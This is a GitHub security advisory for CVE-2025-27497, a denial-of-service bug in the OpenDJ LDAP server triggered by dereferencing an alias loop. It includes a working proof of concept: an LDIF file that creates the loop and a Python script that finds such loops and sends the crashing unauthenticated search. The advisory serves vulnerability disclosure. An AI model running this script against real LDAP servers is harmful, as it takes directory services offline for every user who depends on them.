# [H] OpenDJ Denial of Service (DoS) using alias loop

## Summary
Severity: High
Advisory: GHSA-93qr-h8pr-4593
CVE: CVE-2025-27497
CWE: CWE-835
Ecosystem: Maven
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2025-03-05
Source: https://github.com/advisories/GHSA-93qr-h8pr-4593
Type: github-advisory

## Affected
- Maven: `org.openidentityplatform.opendj:opendj-server-legacy` — affected >=0 <4.9.3

## Details
### Summary
A denial-of-service (DoS) vulnerability in OpenDJ has been discovered that causes the server to become unresponsive to all LDAP requests without crashing or restarting. This issue occurs when an alias loop exists in the LDAP database. If an `ldapsearch` request is executed with alias dereferencing set to "always" on this alias entry, the server stops responding to all future requests.
I have confirmed this issue using the latest OpenDJ version (9.2), both with the official OpenDJ Docker image and a local OpenDJ server running on my Windows 10 machine.

### Details
An unauthenticated attacker can exploit this vulnerability using a single crafted `ldapsearch` request. Fortunately, the server can be restarted without data corruption. While this attack requires the existence of an alias loop, I am uncertain whether such loops can be easily created in specific environments or if the method can be adapted to execute other DoS attacks more easily.

### PoC (Steps to Reproduce)
1. Set up an OpenDJ server instance as usual, using the base DN `dc=example,dc=com`
2. Import the attached `example_data_alias_dos.ldif` file into the LDAP database
3. Ensure that the `ldap3` Python library is installed (`pip install ldap3`)
4. Run the attached Python script `python opendj_alias_dos.py`, which searches for alias loops and executes the DoS attack
5. After executing the script, the server will stop responding to requests until it is restarted

### Impact
This vulnerability directly affects server availability for everyone using it. A single `ldapsearch` request on an alias loop entry can cause the entire server to become unresponsive, requiring a restart. The issue can be repeatedly triggered. The following response message is displayed on following requests:
```
result: 80 Other (e.g., implementation specific) error
text: com.sleepycat.je.EnvironmentFailureException: (JE 18.3.12) JAVA_ERROR: Java Error occurred, recovery may not be possible.
```

**example_data_alias_dos.ldif**
```
dn: dc=example,dc=com
objectClass: top
objectClass: domain
dc: example

dn: ou=people,dc=example,dc=com
objectClass: top
objectClass: organizationalUnit
ou: people
description: All users

dn: ou=students,ou=people,dc=example,dc=com
objectClass: top
objectClass: organizationalUnit
ou: students
description: All students

dn: uid=jd123,ou=students,ou=people,dc=example,dc=com
objectClass: top
objectClass: inetOrgPerson
objectClass: organizationalPerson
objectClass: person
mail: jd123@example.com
sn: Doe
cn: John Doe
givenName: John
uid: jd123

dn: ou=employees,ou=people,dc=example,dc=com
objectClass: top
objectClass: organizationalUnit
ou: employees
description: All employees

dn: uid=jd123,ou=employees,ou=people,dc=example,dc=com
objectClass: alias
objectClass: top
objectClass: extensibleObject
aliasedObjectName: uid=jd123,ou=researchers,ou=people,dc=example,dc=com
uid: jd123

dn: ou=researchers,ou=people,dc=example,dc=com
objectClass: top
objectClass: organizationalUnit
ou: researchers
description: All reasearchers

dn: uid=jd123,ou=researchers,ou=people,dc=example,dc=com
objectClass: alias
objectClass: top
objectClass: extensibleObject
aliasedObjectName: uid=jd123,ou=employees,ou=people,dc=example,dc=com
uid: jd123
```

**opendj_alias_dos.py**
```Python
import argparse

from ldap3 import Server, Connection, ALL, DEREF_NEVER, DEREF_ALWAYS
from ldap3.core.exceptions import LDAPBindError, LDAPSocketOpenError


def connect_to_ldap(ip, port):
    try:
        server = Server(ip, port, get_info=ALL)
        connection = Connection(server, auto_bind=True)
        return connection
    except (LDAPBindError, LDAPSocketOpenError) as e:
        print(f"Error connecting to LDAP server: {e}")
        return None


def find_aliases(connection, base_dn):
    try:
        search_filter = "(objectClass=alias)"
        connection.search(base_dn, search_filter=search_filter, dereference_aliases=DEREF_NEVER, attributes=["*"])
    except Exception as e:
        print(f"Error during search: {e}")

    aliases = {}
    for entry in connection.entries:
        entry_dn = entry.entry_dn
        entry_alias = entry.aliasedObjectName.value
        aliases[entry_dn] = entry_alias

    return aliases


def detect_alias_loop(aliases):
    visited = set()
    path = set()

    def dfs(alias):
        if alias in path:
            return alias
        if alias in visited:
            return None

        path.add(alias)
        visited.add(alias)

        aliased_target = aliases.get(alias)
        if aliased_target:
            result = dfs(aliased_target)
            if result:
                return result

        path.remove(alias)
        return None

    for alias in aliases:
        if alias not in visited:
            loop_alias = dfs(alias)
            if loop_alias:
                return loop_alias

    return None


def execute_dos_search(connection, looping_alias_dn):
    try:
        search_filter = "(objectClass=*)"
        connection.search(looping_alias_dn, search_filter=search_filter, dereference_aliases=DEREF_ALWAYS)
    except Exception as e:
        print(f"Error during search: {e}")

    for entry in connection.entries:
        entry_dn = entry.entry_dn
        print(entry_dn)


def main():
    parser = argparse.ArgumentParser(description="Search LDAP for circular alias references.")
    parser.add_argument("ip", type=str, nargs="?", default=None, help="The IP address of the LDAP server.")
    parser.add_argument("port", type=int, nargs="?", default=None, help="The port of the LDAP server.")
    parser.add_argument("base", type=str, nargs="?", default=None, help="The base DN of the LDAP server.")
    args = parser.parse_args()

    if not args.ip:
        args.ip = input("Please enter the IP address of the LDAP server: ")

    if not args.port:
        while True:
            try:
                port_input = input("Please enter the port of the LDAP server: ")
                args.port = int(port_input)
                break
            except ValueError:
                print("Invalid input. Please enter a valid integer for the port.")

    if not args.base:
        args.base = input("Please enter the base DN of the LDAP server: ")

    connection = connect_to_ldap(args.ip, args.port)
    if connection:
        aliases = find_aliases(connection, args.base)
        looping_alias_dn = detect_alias_loop(aliases)
        if looping_alias_dn:
            execute_dos_search(connection, looping_alias_dn)
            print(f"DOS executed with alias: {looping_alias_dn}")
        else:
            print("No looping alias DN found!")
        connection.unbind()


if __name__ == "__main__":
    main()
```

## References
- https://github.com/OpenIdentityPlatform/OpenDJ/security/advisories/GHSA-93qr-h8pr-4593
- https://nvd.nist.gov/vuln/detail/CVE-2025-27497
- https://github.com/OpenIdentityPlatform/OpenDJ/commit/08aee4724608e4a32baa3c7d7499ec913a275aaf
- https://github.com/OpenIdentityPlatform/OpenDJ
